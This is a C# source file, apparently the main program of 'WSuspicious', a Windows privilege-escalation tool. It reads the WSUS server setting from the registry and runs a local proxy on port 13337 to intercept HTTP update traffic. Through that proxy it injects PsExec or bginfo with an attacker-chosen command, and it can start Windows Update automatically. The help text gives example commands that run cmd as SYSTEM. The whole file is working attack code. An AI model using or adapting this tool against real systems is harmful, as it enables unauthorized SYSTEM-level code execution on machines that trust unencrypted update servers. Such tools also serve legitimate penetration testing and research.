using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using WSuspicious.Proxy;

namespace WSuspicious
{
    class Program
    {
        public static int Main(string[] args)
        {
            Dictionary<string, string> arguments = ArgumentsParser.parse(args);
            if (arguments.ContainsKey("/help"))
            {
                PrintHelp();
                return 0;
            }

            string wsusConfig = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", "WUServer", null);


            string wsusHost = null;
            bool isHttps = false;
            if (wsusConfig != null)
            {
                Uri wsusURI = new Uri(wsusConfig);
                wsusHost = wsusURI.Host;

                if (wsusURI.Scheme == "https")
                {
                    Console.WriteLine("The WSUS Server is using HTTPS.");
                    Console.WriteLine("Stopping now.");
                    return 0;
                }

                Console.WriteLine(String.Format("Detected WSUS Server - {0}", wsusHost));

                using (WsusProxy proxy = new WsusProxy(wsusHost, isHttps, File.ReadAllBytes(arguments["/exe"]), Path.GetFileName(arguments["/exe"]), arguments["/command"], arguments.ContainsKey("/debug")))
                {
                    proxy.Start(13337);

                    Console.WriteLine("Hit any key to exit..");

                    if (arguments.ContainsKey("/autoinstall"))
                    {
                        WindowsUpdateLauncher.StartUpdates();
                    }

                    Console.WriteLine();
                    Console.Read();
                }
            }
            else
            {
                Console.WriteLine("No WSUS Server detected.");
                Console.WriteLine("Stopping now.");
            }
            return 0;
        }

        public static void PrintHelp()
        {
            Console.WriteLine(@"
                Usage: WSuspicious [OPTION]...
                    Ex. WSuspicious.exe /command:"" - accepteula - s - d cmd / c """"echo 1 > C:\\wsuspicious.txt"""""" /autoinstall
                Creates a local proxy to intercept WSUS requests and try to escalate privileges.
                If launched without any arguments, the script will simply create the file C:\\wsuspicious.was.here

                  /exe                The full path to the executable to run
                                      Known payloads are bginfo and PsExec. (Default: .\PsExec64.exe)
                  /command            The command to execute (Default: -accepteula -s -d cmd /c ""echo 1 > C:\\wsuspicious.was.here"")
                  /debug              Increase the verbosity of the tool
                  /autoinstall        Start Windows updates automatically after the proxy is started.
                  /help               Display this help and exit
            ");
        }
    }
}
